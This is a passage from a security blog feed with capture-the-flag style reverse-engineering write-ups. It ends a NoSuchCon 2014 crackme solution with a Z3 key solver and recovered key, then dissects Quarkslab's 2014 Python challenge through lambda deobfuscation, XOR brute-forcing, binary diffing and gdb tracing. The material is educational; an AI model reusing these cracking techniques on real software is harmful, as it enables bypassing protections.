pwd[i] = ((pwd[i] &lt;&lt; ((i+0x1)&amp;0x1F))|(pwd[i] >> ((((0x0|i)<sup>0xFFFFFFFF</sup>)+0x20)&amp;0x1F)))
i = (i+0x1)
```</p>

<h2>Solving with Z3</h2>

<p>Okay, so now we have a Python (and even C ;) file describing the operations performed on the 6 dwords containing the input key. We could try to bruteforce it, but using a constraint solver is much more elegant and faster. I also chose Z3 because it has nice Python bindings. And since its expression syntax is mostly compatible with Python, we just need to add a few things to our generated file!</p>

<p>```python sample_solver.py
from z3 import *
import struct</p>

<p>solution_str = &ldquo;[ Synacktiv + NSC = &lt;3 ]&rdquo;
solutions = struct.unpack(&ldquo;&lt;LLLLLL&rdquo;, solution_str)
N = len(solutions)</p>

<h1>Hook Z3&rsquo;s <code>&gt;&gt;</code> so it works with our algorithm</h1>

<h1>(logical shift instead of arithmetic one)</h1>

<p>BitVecRef.<strong>rshift</strong>  = LShR</p>

<p>pwd = [BitVec(&ldquo;pwd_%d&rdquo; % i, 32) for i in range(N)]
pwd_orig = [pwd[i] for i in range(N)]
i = 0</p>

<h1>paste here all the generated algorithm from previous part</h1>

<h1>BEGIN ALGO</h1>

<p>pwd[i] = (pwd[i]+(&ndash; i))
pwd[i] = ((0x0|pwd[i])<sup>0xFFFFFFFF</sup>)</p>

<h1>[&hellip;]</h1>

<p>pwd[i] = ((pwd[i] &lt;&lt; ((i+0x1)&amp;0x1F))|(pwd[i] >> ((((0x0|i)<sup>0xFFFFFFFF</sup>)+0x20)&amp;0x1F)))
i = (i+0x1)</p>

<h1>END ALGO</h1>

<p>s = Solver()</p>

<p>for i in range(N):</p>

<pre><code>s.add(pwd[i] == solutions[i])
</code></pre>

<p>assert s.check() == sat</p>

<p>m = s.model()
sol_dw = [m[pwd_orig[i]].as_long() for i in range(N)]
key = &lsquo;&rsquo;.join((&ldquo;%08x&rdquo; % dw)[::-1].upper() for dw in sol_dw)</p>

<p>print &ldquo;KEY = %s&rdquo; % key
```</p>

<p>We&rsquo;ve declared the valid solution, the list of 6 32-bit variables (<code>pwd</code>), pasted the algorithm, and ran the solver. We just need to be careful with the <code>&gt;&gt;</code> operation, since Z3 <a href="http://stackoverflow.com/a/25535854">treats</a> it as an arithmetic shift, and we want a logical one. So we replace it with a dirty hook.</p>

<p>The solution should come almost instantly:</p>

<p><code>bash
$ python sample_solver.py
KEY = 322644EF941077AB1115AB575363AE87F58E6D9AFE5C62CC
</code></p>

<h2>Alternative solution &ndash; conclusion</h2>

<p>I chose this solution not only to get acquainted with Miasm, but also because it required much less effort and pain :). It fits into approximately 20 lines of GDB script, and 120 of python using Miasm and Z3. You can find all of those in this <a href="https://github.com/egirault/NoSuchCon2014/tree/master/">folder</a>.
I hope it gave you an understandable example of symbolic execution and what you can do with it. However I strongly encourage you to dig into Miasm&rsquo;s code and examples if you want to really understand what&rsquo;s going on under the hood.</p>

<h1>War&rsquo;s over, the final words</h1>

<p>I guess this is where I thank both <a href="https://twitter.com/elvanderb">@elvanderb</a> for this really cool challenge and <a href="https://twitter.com/synacktiv">@synacktiv</a> for letting him write it :&ndash;). <em>Emilien</em> and I also hope you enjoyed the read, feel free to contact any of us if you have any remarks/questions/whatever.</p>

<p>Also, special thanks to <a href="https://twitter.com/__x86">@__x86</a> and <a href="https://twitter.com/jonathansalwan">@jonathansalwan</a> for proofreading!</p>

<p>The codes/traces/tools developed in this post are all available on github <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2014">here</a> and <a href="https://github.com/egirault/NoSuchCon2014/tree/master/">here</a>!</p>

<p>By the way, don&rsquo;t hesitate to contact a member of the staff if you have a cool post you would like to see here &mdash; you too can end up in <a href="https://doar-e.github.io/about/">doar-e&rsquo;s wall of fame</a> :&ndash;).</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dissection of Quarkslab's 2014 security challenge]]></title>
    <link href="http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge/"/>
    <updated>2014-09-06T20:37:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>As the blog was a bit silent for quite some time, I figured it would be cool to put together a post ; so here it is folks, dig in!</p>

<p>The French company <a href="http://blog.quarkslab.com/you-like-python-security-challenge-and-traveling-win-a-free-ticket-to-hitb-kul.html">Quarkslab</a> <a href="https://twitter.com/quarkslab/status/507457671386394624">recently</a> <a href="https://twitter.com/HITBSecConf/status/507458788522094592">released</a> a security challenge to win a free entrance to attend the upcoming <a href="https://conference.hitb.org/hitbsecconf2014kul/">HITBSecConf</a> conference in Kuala Lumpur from the 13th of October until the 16th.</p>

<p>The challenge has been written by <a href="http://blog.quarkslab.com/author/serge-guelton.html">Serge Guelton</a>, a R&amp;D engineer specialized in compilers/parallel computations. At the time of writing, already eight different people manage to solve the challenge, and one of the ticket seems to have been won by <code>hackedd</code>, so congrats to him!</p>

<p><img class="center" src="/images/dissection_of_quarkslab_s_2014_security_challenge/woot.png"></p>

<p>According to the description of the challenge Python is heavily involved, which is a good thing for at least two reasons:</p>

<ul>
<li>first because I already had <a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">the occasion</a> to look at its source code in the past,</li>
<li>and because I so am a <a href="https://github.com/0vercl0k/stuffz/tree/master/Python's%20internals">big fan of Python</a>.</li>
</ul>


<p>In this post I will describe how I tackled this problem, how I managed to solve it. And to make up for me being slow at solving it I tried to make it fairly detailed.</p>

<p>At first it was supposed to be quite short though, but well..I decided to analyze fully the challenge even if it wasn&rsquo;t needed to find the key unfortunately, so it is a bit longer than expected :&ndash;).</p>

<p>Anyway, sit down, make yourself at home and let me pour you a cup of tea before we begin :&ndash;).</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Finding the URL of the challenge</h1>

<h2>Very one-liner, much lambdas, such a pain</h2>

<p>The first part of the challenge is to retrieve an url hidden in the following Python one-liner:</p>

<p>`&ldquo;python Very one-liner, much lambdas
(lambda g, c, d: (lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;$&rsquo;, &rdquo;.join([(<em>[&lsquo;chr&rsquo;] if (&lsquo;chr&rsquo;
in </em>) else chr)((<em>[&lsquo;</em>&rsquo;] if (&lsquo;<em>&rsquo; in </em>) else <em>)) for </em>[&lsquo;<em>&rsquo;] in (</em>[&rsquo;s'] if (&rsquo;s'
in <em>) else s)[::(-1)]])), </em>)[-1])( (lambda <em>: (lambda f, </em>: f(f, <em>))((lambda
__,</em>: ((lambda <em>: <strong>(</strong>, </em>))((lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;i&rsquo;, ((<em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo;
in </em>) else i) + 1)),<em>)[(-1)])((lambda </em>: (<em>.<strong>setitem</strong>(&rsquo;s',((</em>[&rsquo;s'] if (&rsquo;s'
in <em>) else s) + [((</em>[&lsquo;l&rsquo;] if (&lsquo;l&rsquo; in <em>) else l)[(</em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo; in <em>) else i
)] ^ (</em>[&lsquo;c&rsquo;] if (&lsquo;c&rsquo; in <em>) else c))])), </em>)[-1])(<em>))) if (((</em>[&lsquo;g&rsquo;] if (&lsquo;g&rsquo; in
<em>) else g) % 4) and ((</em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo; in <em>) else i)&lt; (</em>[&lsquo;len&rsquo;] if (&lsquo;len&rsquo; in _
) else len)((<em>[&lsquo;l&rsquo;] if (&lsquo;l&rsquo; in </em>) else l)))) else <em>)), </em>) ) ( (lambda <em>: (</em>.
<strong>setitem</strong>(&lsquo;!&rsquo;, []), <em>.<strong>setitem</strong>(&rsquo;s', </em>[&lsquo;!&rsquo;]), <em>)[(-1)] ) ((lambda </em>: (<em>.
<strong>setitem</strong>(&lsquo;!&rsquo;, ((</em>[&rsquo;d'] if (&rsquo;d' in <em>) else d) ^ (</em>[&rsquo;d'] if (&rsquo;d' in <em>) else
d))), </em>.<strong>setitem</strong>(&lsquo;i&rsquo;, <em>[&lsquo;!&rsquo;]), </em>)[(-1)])((lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;!&rsquo;, [
(<em>[&lsquo;j&rsquo;] if (&lsquo;j&rsquo; in </em>) else j) for  <em>[ &lsquo;i&rsquo;] in (</em>[&lsquo;zip&rsquo;] if (&lsquo;zip&rsquo; in <em>) else
zip)((</em>[&lsquo;l0&rsquo;] if (&lsquo;l0&rsquo; in <em>) else l0), (</em>[&lsquo;l1&rsquo;] if (&lsquo;l1&rsquo; in <em>) else l1)) for
</em>[&lsquo;j&rsquo;] in (<em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo; in </em>) else i)]), <em>.<strong>setitem</strong>(&lsquo;l&rsquo;, </em>[&lsquo;!&rsquo;]), <em>)[-1
])((lambda </em>: (<em>.<strong>setitem</strong>(&lsquo;!&rsquo;, [1373, 1281, 1288, 1373, 1290, 1294, 1375,
1371,1289, 1281, 1280, 1293, 1289, 1280, 1373, 1294, 1289, 1280, 1372, 1288,
1375,1375, 1289, 1373, 1290, 1281, 1294, 1302, 1372, 1355, 1366, 1372, 1302,
1360, 1368, 1354, 1364, 1370, 1371, 1365, 1362, 1368, 1352, 1374, 1365, 1302
]), </em>.<strong>setitem</strong>(&lsquo;l1&rsquo;,<em>[&lsquo;!&rsquo;]), </em>)[-1])((lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;!&rsquo;,[1375,
1368, 1294, 1293, 1373, 1295, 1290, 1373, 1290, 1293, 1280, 1368, 1368,1294,
1293, 1368, 1372, 1292, 1290, 1291, 1371, 1375, 1280, 1372, 1281, 1293,1373,
1371, 1354, 1370, 1356, 1354, 1355, 1370, 1357, 1357, 1302, 1366, 1303,1368,
1354, 1355, 1356, 1303, 1366, 1371]), <em>.<strong>setitem</strong>(&lsquo;l0&rsquo;, </em>[&lsquo;!&rsquo;]), _)[(-1)])</p>

<pre><code>        ({ 'g': g, 'c': c, 'd': d, '$': None})))))))['$'])
</code></pre>

<p>```</p>

<p>I think that was the first time I was seeing obfuscated Python and believe me I did a really strange face when seeing that snippet. But well, with a bit of patience we should manage to get a better understanding of how it is working, let&rsquo;s get to it!</p>

<h2>Tidying up the last one..</h2>

<p>Before doing that here are things we can directly observe just by looking closely at the snippet:</p>

<ul>
<li>We know this function has three arguments ; we don&rsquo;t know them at this point though</li>
<li>The snippet seems to reuse <em>__setitem__</em> quite a lot ; it may mean two things for us:

<ul>
<li>The only standard Python object I know of with a <em>__setitem__</em> function is <em>dictionary</em>,</li>
<li>The way the snippet looks like, it seems that once we will understand one of those <em>__setitem__</em> call, we will understand them all</li>
</ul>
</li>
<li>The following standard functions are used: <em>chr</em>, <em>len</em>, <em>zip</em>

<ul>
<li>That means manipulation of strings, integers and iterables</li>
</ul>
</li>
<li>There are two noticeable operators: <em>mod</em> and <em>xor</em></li>
</ul>


<p>With all that information in our sleeve, the first thing I did was to try to clean it up, starting from the last lambda in the snippet. It gives something like:</p>

<p>```python Last lambda cleaned
tab0 = [</p>

<pre><code>1375, 1368, 1294, 1293, 1373, 1295, 1290, 1373, 1290, 1293,
1280, 1368, 1368, 1294, 1293, 1368, 1372, 1292, 1290, 1291,
1371, 1375, 1280, 1372, 1281, 1293, 1373, 1371, 1354, 1370,
1356, 1354, 1355, 1370, 1357, 1357, 1302, 1366, 1303, 1368,
1354, 1355, 1356, 1303, 1366, 1371
</code></pre>

<p>]</p>

<p>z = lambda x: (</p>

<pre><code>x.__setitem__('!', tab0),
x.__setitem__('l0', x['!']),
x
</code></pre>

<p>)[-1]
```</p>

<p>That lambda takes a dictionary <em>x</em>, sets two items, generates a tuple with a reference to the dictionary at the end of the tuple ; finally the lambda is going to return that same dictionary.
It also uses <em>x[&lsquo;!&rsquo;]</em> as a temporary variable to then assign its value to <em>x[&lsquo;l0&rsquo;]</em>.</p>

<p>Long story short, it basically takes a dictionary, updates it and returns it to the caller: clever trick to pass that same object across lambdas. We can also see that easily in Python directly:</p>

<p><code>text lambda, dictionary &amp; setitem
In [8]: d = {}
In [9]: z(d)
Out[9]:
{'!': [1375,
  ...
 'l0': [1375,
  ...
}
</code></p>

<p>That lambda is even called with a dictionary that will contain, among other things, the three user controlled variable: <em>g</em>, <em>c</em>, <em>d</em>.
That dictionary seems to be some kind of storage used to keep track of all the variables that will be used across those lambdas.</p>

<p>```python lambda &amp; the resulting dictionary</p>

<h1>Returns { &lsquo;g&rsquo; : g, &lsquo;c&rsquo;, &rsquo;d': d, &lsquo;$&rsquo;:None, &lsquo;!&rsquo;:tab0, &lsquo;l0&rsquo;:tab0}</h1>

<p>last_res = (</p>

<pre><code>(
    lambda x: (
        x.__setitem__('!', tab0),
        x.__setitem__('l0', x['!']),
        x
    )[-1]
)
({ 'g': g, 'c': c, 'd': d, '$': None})
</code></pre>

<p>)
```</p>

<h2>..then the one before&hellip;</h2>

<p>Now if we repeat that same operation with the one before the last lambda, we have the exact same pattern:</p>

<p>```python lambda before the last one
tab1 = [</p>

<pre><code>1373, 1281, 1288, 1373, 1290, 1294, 1375, 1371, 1289, 1281,
1280, 1293, 1289, 1280, 1373, 1294, 1289, 1280, 1372, 1288,
1375, 1375, 1289, 1373, 1290, 1281, 1294, 1302, 1372, 1355,
1366, 1372, 1302, 1360, 1368, 1354, 1364, 1370, 1371, 1365,
1362, 1368, 1352, 1374, 1365, 1302
</code></pre>

<p>]</p>

<p>zz = lambda x: (</p>

<pre><code>x.__setitem__('!', tab1),
x.__setitem__('l1', x['!']),
x
</code></pre>

<p>)[-1]
```</p>

<p>Perfect, now let&rsquo;s repeat the same operations over and over again. At some point, the whole thing becomes crystal clear (sort-of):</p>

<p>```python cleaned nested lambdas</p>

<h1>Returns {</h1>

<p>  # &lsquo;g&rsquo;:g, &lsquo;c&rsquo;:c, &rsquo;d':d,
  # &lsquo;!&rsquo;:[],
  # &rsquo;s':[],
  # &lsquo;l&rsquo;:[j for i in zip(tab0, tab1) for j in i],
  # &lsquo;l1&rsquo;:tab1,
  # &lsquo;l0&rsquo;:tab0,
  # &lsquo;i&rsquo;: 0,
  # &lsquo;j&rsquo;: 1302,
  # &lsquo;$&rsquo;:None</p>

<h1>}</h1>

<p>res_after_all_operations = (
  (</p>

<pre><code>lambda x: (
    x.__setitem__('!', []),
    x.__setitem__('s', x['!']),
    x
)[-1]
</code></pre>

<p>  )
  # ..
  (</p>

<pre><code>(
  lambda x: (
      x.__setitem__('!', ((x['d'] if ('d' in x) else d) ^ (x['d'] if ('d' in x) else d))),
      x.__setitem__('i', x['!']),
      x
  )[-1]
)
# ..
(
  (
    lambda x: (
        x.__setitem__('!', [(x['j'] if ('j' in x) else j) for x[ 'i'] in (x['zip'] if ('zip' in x) else zip)((x['l0'] if ('l0' in x) else l0), (x['l1'] if ('l1' in x) else l1)) for x['j'] in (x['i'] if ('i' in x) else i)]),
        x.__setitem__('l', x['!']),
        x
    )[-1]
  )
  # Returns { 'g':g, 'c':c, 'd':d, '!':tab1, 'l1':tab1, 'l0':tab0, '$':None}
  (
    (
      lambda x: (
          x.__setitem__('!', tab1),
          x.__setitem__('l1', x['!']),
          x
      )[-1]
    )
    # Return { 'g' : g, 'c', 'd': d, '!':tab0, 'l0':tab0, '$':None }
    (
      (
        lambda x: (
            x.__setitem__('!', tab0),
            x.__setitem__('l0', x['!']),
            x
        )[-1]
      )
      ({ 'g': g, 'c': c, 'd': d, '$': None})
    )
  )
)
</code></pre>

<p>  )
)
```</p>

<h2>Putting it all together</h2>

<p>After doing all of that, we know now the types of the three variables the function needs to work properly (and we don&rsquo;t really need more to be honest):</p>

<ul>
<li><em>g</em> is an integer that will be mod 4

<ul>
<li>if the value is divisible by 4, the function returns nothing ; so we will need to have this variable sets to 1 for example</li>
</ul>
</li>
<li><em>c</em> is another integer that looks like a xor key ; if we look at the snippet, this variable is used to xor each byte of <em>x[&lsquo;l&rsquo;]</em> (which is the table with tab0 and tab1)

<ul>
<li>this is the interesting parameter</li>
</ul>
</li>
<li><em>d</em> is another integer that we can also ignore: it&rsquo;s only used to set <em>x[&lsquo;i&rsquo;]</em> to zero by xoring <em>x[&rsquo;d']</em> by itself.</li>
</ul>


<p>We don&rsquo;t need anything else really now: no more lambdas, no more pain, no more tears. It is time to write what I call, an <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/bf_with_lambdas_cleaned.py"><em>educated</em> brute-forcer</a>, to find the correct value of <em>c</em>:
```python bf_with_lambdas_cleaned.py
import sys</p>

<p>def main(argc, argv):</p>

<pre><code>tab0 = [1375, 1368, 1294, 1293, 1373, 1295, 1290, 1373, 1290, 1293, 1280, 1368, 1368,1294, 1293, 1368, 1372, 1292, 1290, 1291, 1371, 1375, 1280, 1372, 1281, 1293,1373, 1371, 1354, 1370, 1356, 1354, 1355, 1370, 1357, 1357, 1302, 1366, 1303,1368, 1354, 1355, 1356, 1303, 1366, 1371]
tab1 = [1373, 1281, 1288, 1373, 1290, 1294, 1375, 1371,1289, 1281, 1280, 1293, 1289, 1280, 1373, 1294, 1289, 1280, 1372, 1288, 1375,1375, 1289, 1373, 1290, 1281, 1294, 1302, 1372, 1355, 1366, 1372, 1302, 1360, 1368, 1354, 1364, 1370, 1371, 1365, 1362, 1368, 1352, 1374, 1365, 1302]

func = (
    lambda g, c, d: 
    (
        lambda x: (
            x.__setitem__('$', ''.join([(x['chr'] if ('chr' in x) else chr)((x['_'] if ('_' in x) else x)) for x['_'] in (x['s'] if ('s' in x) else s)[::-1]])),
            x
        )[-1]
    )
    (
        (
            lambda x: 
                (lambda f, x: f(f, x))
            (
                (
                    lambda __, x: 
                    (
                        (lambda x: __(__, x))
                        (
                            # i += 1
                            (
                                lambda x: (
                                    x.__setitem__('i', ((x['i'] if ('i' in x) else i) + 1)),
                                    x
                                )[-1]
                            )
                            (
                                # s += [c ^ l[i]]
                                (
                                    lambda x: (
                                        x.__setitem__('s', (
                                                (x['s'] if ('s' in x) else s) +
                                                [((x['l'] if ('l' in x) else l)[(x['i'] if ('i' in x) else i)] ^ (x['c'] if ('c' in x) else c))]
                                            )
                                        ),
                                        x
                                    )[-1]
                                )
                                (x)
                            )
                        )
                        # if ((x['g'] % 4) and (x['i'] &lt; len(l))) else x
                        if (((x['g'] if ('g' in x) else g) % 4) and ((x['i'] if ('i' in x) else i)&lt; (x['len'] if ('len' in x) else len)((x['l'] if ('l' in x) else l))))
                        else x
                    )
                ),
                x
            )
        )
        # Returns { 'g':g, 'c':c, 'd':d, '!':zip(tab1, tab0), 'l':zip(tab1, tab0), l1':tab1, 'l0':tab0, 'i': 0, 'j': 1302, '!':0, 's':[] }
        (
            (
                lambda x: (
                    x.__setitem__('!', []),
                    x.__setitem__('s', x['!']),
                    x
                )[-1]
            )
            # Returns { 'g':g, 'c':c, 'd':d, '!':zip(tab1, tab0), 'l':zip(tab1, tab0), l1':tab1, 'l0':tab0, 'i': 0, 'j': 1302, '!':0}
            (
                (
                    lambda x: (
                        x.__setitem__('!', ((x['d'] if ('d' in x) else d) ^ (x['d'] if ('d' in x) else d))),
                        x.__setitem__('i', x['!']),
                        x
                    )[-1]
                )
                # Returns { 'g' : g, 'c', 'd': d, '!':zip(tab1, tab0), 'l':zip(tab1, tab0), l1':tab1, 'l0':tab0, 'i': (1371, 1302), 'j': 1302}
                (
                    (
                        lambda x: (
                            x.__setitem__('!', [(x['j'] if ('j' in x) else j) for x[ 'i'] in (x['zip'] if ('zip' in x) else zip)((x['l0'] if ('l0' in x) else l0), (x['l1'] if ('l1' in x) else l1)) for x['j'] in (x['i'] if ('i' in x) else i)]),
                            x.__setitem__('l', x['!']),
                            x
                        )[-1]
                    )
                    # Returns { 'g' : g, 'c', 'd': d, '!':tab1, 'l1':tab1, 'l0':tab0}
                    (
                        (
                            lambda x: (
                                x.__setitem__('!', tab1),
                                x.__setitem__('l1', x['!']),
                                x
                            )[-1]
                        )
                        # Return { 'g' : g, 'c', 'd': d, '!' : tab0, 'l0':tab0}
                        (
                            (
                                lambda x: (
                                    x.__setitem__('!', tab0),
                                    x.__setitem__('l0', x['!']),
                                    x
                                )[-1]
                            )
                            ({ 'g': g, 'c': c, 'd': d, '$': None})
                        )
                    )
                )
            )
        )
    )['$']
)

for i in range(0x1000):
    try:
        ret = func(1, i, 0)
        if 'quarks' in ret:
            print ret
    except:
        pass
return 1
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>sys.exit(main(len(sys.argv), sys.argv))
</code></pre>

<p>```</p>

<p>And after running it, we are good to go:
<code>text w00tw00t
D:\Codes\challenges\ql-python&gt;bf_with_lambdas_cleaned.py
/blog.quarkslab.com/static/resources/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</code></p>

<h1>A custom ELF64 Python interpreter you shall debug</h1>

<h2>Recon</h2>

<p>All right, here we are: we now have the real challenge. First, let&rsquo;s see what kind of information we get for free:
<code>bash recon
overclok@wildout:~/chall/ql-py$ file b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs),
for GNU/Linux 2.6.26, not stripped
overclok@wildout:~/chall/ql-py$ ls -lah b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
-rwxrw-r-x 1 overclok overclok 7.9M Sep  8 21:03 b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</code></p>

<p>The binary is quite big, not good for us. But on the other hand, the binary isn&rsquo;t stripped so we might find useful debugging information at some point.</p>

<p>```bash ./b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>

<p>That does explain the size of the binary then: we basically have something that looks like a custom Python interpreter. Note that I also remembered reading <em><a href="http://blog.quarkslab.com/building-an-obfuscated-python-interpreter-we-need-more-opcodes.html">Building an obfuscated Python interpreter: we need more opcodes</a></em> on <em>Quarkslab</em>&rsquo;s blog where Serge described how you could tweak the interpreter sources to add / change some opcodes either for optimization or obfuscation purposes.</p>

<h2>Finding the interesting bits</h2>

<p>The next step is to figure out what part of the binary is interesting, what functions have been modified, and where we find the problem we need to solve to get the flag. My idea for that was to use a <em>binary-diffing</em> tool between an original <em>Python278</em> interpreter and the one we were given.</p>

<p>To do so I just grabbed <em>Python278</em>&rsquo;s sources and compiled them by myself:</p>

<p><code>bash compiling Py278
overclok@wildout:~/chall/ql-py$ wget https://www.python.org/ftp/python/2.7.8/Python-2.7.8.tgz &amp;&amp; tar xzvf Python-2.7.8.tgz
overclok@wildout:~/chall/ql-py$ tar xzvf Python-2.7.8.tgz
overclok@wildout:~/chall/ql-py$ cd Python-2.7.8/ &amp;&amp; ./configure &amp;&amp; make
overclok@wildout:~/chall/ql-py/Python-2.7.8$ ls -lah ./python
-rwxrwxr-x 1 overclok overclok 8.0M Sep  5 00:13 ./python
</code></p>

<p>The resulting binary has a similar size, so it should do the job even if I&rsquo;m not using <em>GCC 4.8.2</em> and the same compilation/optimization options. To perform the <em>diffing</em> I used <em>IDA Pro</em> and <a href="https://code.google.com/p/patchdiff2/">Patchdiff v2.0.10</a>.</p>

<h2>```text Patchdiff result</h2>

<p>PatchDiff Plugin v2.0.10
Copyright &copy; 2010-2011, Nicolas Pouvesle</p>

<h2>Copyright &copy; 2007-2009, Tenable Network Security, Inc</h2>

<p>Scanning for functions &hellip;
parsing second idb&hellip;
parsing first idb&hellip;
diffing&hellip;
Identical functions:   2750
Matched functions:     176
Unmatched functions 1: 23
Unmatched functions 2: 85
done!
```</p>

<p>Once the tool has finished its analysis we just have to check the list of unmatched function names (around one hundred of them, so it&rsquo;s pretty quick), and eventually we see that:</p>

<p><img class="center" src="/images/dissection_of_quarkslab_s_2014_security_challenge/initdo_not_run_me.png"></p>

<p>That function directly caught my eyes (you can even check it doesn&rsquo;t exist in the <em>Python278</em> source tree obviously :&ndash;)), and it appears this function is just setting up a Python module called <em>do_not_run_me</em>.</p>

<p><img class="center" src="/images/dissection_of_quarkslab_s_2014_security_challenge/initdonotrunme_assembly.png"></p>

<p>Let&rsquo;s import it:</p>

<p>```python do_not_run_me module
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
iPython 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>import do_not_run_me
print do_not_run_me.<strong>doc</strong>
None
dir(do_not_run_me)
[&lsquo;<strong>doc</strong>&rsquo;, &lsquo;<strong>name</strong>&rsquo;, &lsquo;<strong>package</strong>&rsquo;, &lsquo;run_me&rsquo;]
print do_not_run_me.run_me.<strong>doc</strong>
There are two kinds of people in the world: those who say there is no such thing as infinite recursion, and those who say ``There are two kinds of people in the world: those who say there is no such thing as infinite recursion, and those who say &hellip;
do_not_run_me.run_me(&lsquo;doar-e&rsquo;)
Segmentation fault
```</p></blockquote></blockquote></blockquote>

<p>All right, we now have something to look at and we are going to do so from a low level point of view because that&rsquo;s what I like ; so don&rsquo;t expect big/magic hacks here :).</p>

<p>If you are not really familiar with Python&rsquo;s VM structures I would advise you to read quickly through this article <em><a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">Deep Dive Into Python’s VM: Story of LOAD_CONST Bug</a></em>, and you should be all set for the next parts.</p>

<h2>do_not_run_me.run_me</h2>

<p>The function is quite small, so it should be pretty quick to analyze:</p>

<ol>
<li>the first part makes sure that we pass a string as an argument when calling <em>run_me</em>,</li>
<li>then a custom <em>marshaled</em> function is loaded, a function is created out of it, and called,</li>
<li>after that it creates another function from the string we pass to the function (which explains the <em>segfault</em> just above),</li>
<li>finally, a last function is created from another hardcoded <em>marshaled</em> string.</li>
</ol>


<h3>First marshaled function</h3>

<p>To understand it we have to dump it first, to unmarshal it and to analyze the resulting code object:</p>

<p>```text unmarshaling the first function
overclok@wildout:~/chall/ql-py$ gdb -q /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Reading symbols from /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf&hellip;done.
gdb$ set disassembly-flavor intel
gdb$ disass run_me
Dump of assembler code for function run_me:
   0x0000000000513d90 &lt;+0>:     push   rbp
   0x0000000000513d91 &lt;+1>:     mov    rdi,rsi
   0x0000000000513d94 &lt;+4>:     xor    eax,eax
   0x0000000000513d96 &lt;+6>:     mov    esi,0x56c70b
   0x0000000000513d9b &lt;+11>:    push   rbx
   0x0000000000513d9c &lt;+12>:    sub    rsp,0x28
   0x0000000000513da0 &lt;+16>:    lea    rcx,[rsp+0x10]
   0x0000000000513da5 &lt;+21>:    mov    rdx,rsp</p>

<p>   ; Parses the arguments we gave, it expects a string object
   0x0000000000513da8 &lt;+24>:    call   0x4cf430 &lt;PyArg_ParseTuple>
   0x0000000000513dad &lt;+29>:    xor    edx,edx
   0x0000000000513daf &lt;+31>:    test   eax,eax
   0x0000000000513db1 &lt;+33>:    je     0x513e5e &lt;run_me+206></p>

<p>   0x0000000000513db7 &lt;+39>:    mov    rax,QWORD PTR [rip+0x2d4342]
   0x0000000000513dbe &lt;+46>:    mov    esi,0x91
   0x0000000000513dc3 &lt;+51>:    mov    edi,0x56c940
   0x0000000000513dc8 &lt;+56>:    mov    rax,QWORD PTR [rax+0x10]
   0x0000000000513dcc &lt;+60>:    mov    rbx,QWORD PTR [rax+0x30]</p>

<p>   ; Creates a code object from the marshaled string
   ; PyObject<em> PyMarshal_ReadObjectFromString(char </em>string, Py_ssize_t len)
   0x0000000000513dd0 &lt;+64>:    call   0x4dc020 &lt;PyMarshal_ReadObjectFromString>
   0x0000000000513dd5 &lt;+69>:    mov    rdi,rax
   0x0000000000513dd8 &lt;+72>:    mov    rsi,rbx</p>

<p>   ; Creates a function object from the marshaled string
   0x0000000000513ddb &lt;+75>:    call   0x52c630 &lt;PyFunction_New>
   0x0000000000513de0 &lt;+80>:    xor    edi,edi
[&hellip;]
gdb$ r -c &lsquo;import do_not_run_me as v; v.run_me(&ldquo;&rdquo;)&rsquo;
Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf -c &lsquo;import do_not_run_me as v; v.run_me(&ldquo;&rdquo;)&rsquo;
[&hellip;]
```</p>

<p>To start, we can set two software breakpoints <em>@0x0000000000513dd0</em> and <em>@0x0000000000513dd5</em> to inspect both the marshaled string and the resulting code object.</p>

<p>Just a little reminder though on the <em>Linux/x64 ABI</em>: &ldquo;The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, and R9&rdquo;.</p>

<p><code>text unmarshaled string inspection
gdb$ p /x $rsi
$2 = 0x91
gdb$ x/145bx $rdi
0x56c940 &lt;+00&gt;:  0x63    0x00    0x00    0x00    0x00    0x01    0x00    0x00
